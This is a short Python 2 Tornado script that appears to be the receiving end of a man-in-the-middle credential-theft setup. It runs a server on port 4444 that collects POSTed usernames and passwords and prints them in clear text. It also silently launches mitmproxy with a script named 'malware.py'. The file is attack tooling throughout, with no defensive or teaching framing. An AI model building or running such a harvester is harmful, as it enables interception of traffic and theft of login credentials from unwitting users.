import os
import threading
import subprocess
from tornado import web, ioloop

users = {}

class HomeHandler(web.RequestHandler):
    def post(self):
        self.content_type = 'application/json'
        username = self.get_argument('username', '')
        password = self.get_argument('password', '')
        if username in users:
            return
        users[username] = password
        print "Username: ", username , " Password: ", password
        self.write({"stat": 'Success'})

application = web.Application([
    (r'/', HomeHandler),
], **{})


class ProxyThread(threading.Thread):
    def run ( self ):
        args = ["mitmproxy", '-s', 'malware.py']
        subprocess.call(args, stdout = open(os.devnull, "w"), stderr=subprocess.STDOUT)

if __name__ == "__main__":
    port = 4444
    application.listen(port)
    ProxyThread().start()
    ioloop.IOLoop.instance().start()
